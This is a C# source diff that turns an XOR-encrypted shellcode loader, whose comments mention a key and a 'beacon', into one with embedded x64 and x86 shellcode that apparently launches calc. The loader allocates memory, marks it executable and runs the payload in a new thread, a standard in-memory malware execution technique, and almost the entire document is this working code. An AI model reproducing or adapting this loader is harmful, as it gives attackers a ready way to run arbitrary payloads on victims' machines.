@@ -1,122 +1,140 @@
 ﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
 using System.Runtime.InteropServices;
 
-namespace CreateThreadExample
+namespace Inject
 {
     class Program
     {
         static void Main(string[] args)
         {
-            // Determine architecture of executing process
-            string arch;
+            byte[] shellcode;
             if (IntPtr.Size == 8)
             {
-                arch = "x64";
+                //x64
+                shellcode = new byte[272] {
+0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
+0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
+0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
+0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
+0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
+0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
+0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
+0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
+0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
+0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
+0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
+0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
+0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
+0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
+0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
+0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
+0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
+0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
+0x63,0x00 };
             }
             else
             {
-                arch = "x86";
+                //x86
+                shellcode = new byte[189] {
+0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
+0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
+0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
+0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
+0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
+0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
+0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
+0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
+0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
+0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
+0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
+0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
+0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00 };
             }
-
-            // Get decrypted pic for shellcode matching our arch
-            byte[] pic = Headers.GetAllDecryptedBytes(arch);
             
-            // Allocate space for it
-            IntPtr segment = Headers.VirtualAlloc(
-                IntPtr.Zero,
-                (uint)pic.Length,
-                Headers.AllocationType.Commit,
-                Headers.MemoryProtection.ReadWrite);
+            // allocate memory
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
 
-            // Copy over pic to segment
-            Marshal.Copy(pic, 0, segment, pic.Length);
+            // copy shellcode to memory
+            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
 
-            // Reprotect segment to make it executable
-            Headers.MemoryProtection oldProtect = new Headers.MemoryProtection();
-            bool rxSuccess = Headers.VirtualProtect(segment, (uint)pic.Length, Headers.MemoryProtection.ExecuteRead, out oldProtect);
+            // fix permissions on allocated memory
+            MemoryProtection oldProtect = new MemoryProtection();
+            bool rxSuccess = VirtualProtect(funcAddr, (UInt32)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
 
-            // Prepare variables for CreateThread
-            IntPtr threadId = IntPtr.Zero;
-            Headers.SECURITY_ATTRIBUTES attrs = new Headers.SECURITY_ATTRIBUTES();
-            // Create the thread
-            IntPtr hThread = Headers.CreateThread(attrs, 0, segment, IntPtr.Zero, Headers.CreationFlags.Immediate, ref threadId);
-            // Wait for its execution to finish, which is until beacon calls exit.
-            Headers.WaitForSingleObject(hThread, 0xFFFFFFFF);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+            // prepare data
+
+            IntPtr pinfo = IntPtr.Zero;
+
+            // execute native code
+
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
         }
-    }
 
-    class Headers
-    {
-        // This is the encryption key for your shellcode
-        public static char[] cryptor = new char[] { '3', 'd', '8', '4', 'c', '9', '2', 'd', '0', '8', '\0' };
-        #region API Calls
+        private static UInt32 MEM_COMMIT = 0x1000;
 
-        [DllImport("kernel32.dll", SetLastError = true)]
+        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+        private static UInt32 PAGE_EXECUTE_READ = 0x20;
+        private static UInt32 PAGE_READWRITE = 0x04;
+
+        [DllImport("kernel32")]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+        
+        [DllImport("kernel32.dll")]
         public static extern bool VirtualProtect(
-            IntPtr lpAddress,
+            UInt32 lpAddress,
             uint dwSize,
-            MemoryProtection flNewProtect,
+            UInt32 flNewProtect,
             out MemoryProtection lpflOldProtect);
+        [DllImport("kernel32")]
+        private static extern bool VirtualFree(IntPtr lpAddress,
+        UInt32 dwSize, UInt32 dwFreeType);
 
-        // https://pinvoke.net/default.aspx/coredll/WaitForSingleObject.html
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern Int32 WaitForSingleObject(IntPtr Handle, UInt32 Wait);
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateThread(
 
-        // https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc
-        [DllImport("kernel32.dll", SetLastError = true)]
-        public static extern IntPtr VirtualAlloc(
-            IntPtr lpStartAddr,
-            uint size,
-            AllocationType flAllocationType,
-            MemoryProtection flProtect);
+        UInt32 lpThreadAttributes,
+        UInt32 dwStackSize,
+        UInt32 lpStartAddress,
+        IntPtr param,
+        UInt32 dwCreationFlags,
+        ref UInt32 lpThreadId
 
-        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
-        public static extern IntPtr CreateThread(
-        SECURITY_ATTRIBUTES lpThreadAttributes, // Don't need this
-        uint dwStackSize,
-        IntPtr lpStartAddress,
-        IntPtr lpParameter,
-        CreationFlags dwCreationFlags,
-        ref IntPtr lpThreadId);
+        );
+        [DllImport("kernel32")]
+        private static extern bool CloseHandle(IntPtr handle);
 
-        #endregion
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(
 
-        #region Structs and Enums
+        IntPtr hHandle,
+        UInt32 dwMilliseconds
+        );
+        [DllImport("kernel32")]
+        private static extern IntPtr GetModuleHandle(
 
-        // https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createthread
-        [Flags]
-        public enum CreationFlags
-        {
-            Immediate = 0,
-            CreateSuspended = 0x00000004,
-            StackSizeParamIsAReservation = 0x00010000
-        }
+        string moduleName
 
-        // https://pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SECURITY_ATTRIBUTES
-        {
-            public int nLength;
-            public unsafe byte* lpSecurityDescriptor;
-            public int bInheritHandle;
-        }
+        );
+        [DllImport("kernel32")]
+        private static extern UInt32 GetProcAddress(
 
-        // https://pinvoke.net/default.aspx/kernel32/VirtualAlloc.html
-        [Flags]
-        public enum AllocationType
-        {
-            Commit = 0x1000,
-            Reserve = 0x2000,
-            Decommit = 0x4000,
-            Release = 0x8000,
-            Reset = 0x80000,
-            Physical = 0x400000,
-            TopDown = 0x100000,
-            WriteWatch = 0x200000,
-            LargePages = 0x20000000
-        }
+        IntPtr hModule,
+        string procName
 
-        [Flags]
+        );
+        
+        [DllImport("kernel32")]
+        private static extern UInt32 GetLastError();
+
         public enum MemoryProtection
         {
             Execute = 0x10,
@@ -131,44 +149,5 @@ namespace CreateThreadExample
             NoCacheModifierflag = 0x200,
             WriteCombineModifierflag = 0x400
         }
-
-        #endregion
-
-        #region Helper Functions
-
-        public static byte[] GetAllDecryptedBytes(string arch)
-        {
-            // You'll need to ensure you have the encrypted shellcode
-            // added as an embedded resource.
-            byte[] rawData;
-            if (arch == "x86")
-            {
-                rawData = new byte[] {
-0xcf,0x8c,0xb1,0x34,0x63,0x39,0x52 };
-            }
-            else
-            {
-                rawData = new byte[] {
-0xcf,0x2c,0xbb,0xd0 };
-            }
-
-
-            byte[] result = new byte[rawData.Length];
-            int j = 0;
-
-            for (int i = 0; i < rawData.Length; i++)
-            {
-                if (j == cryptor.Length - 1)
-                {
-                    j = 0;
-                }
-                byte res = (byte)(rawData[i] ^ Convert.ToByte(cryptor[j]));
-                result[i] = res;
-                j += 1;
-            }
-            return result;
-        }
-
-        #endregion
     }
 }
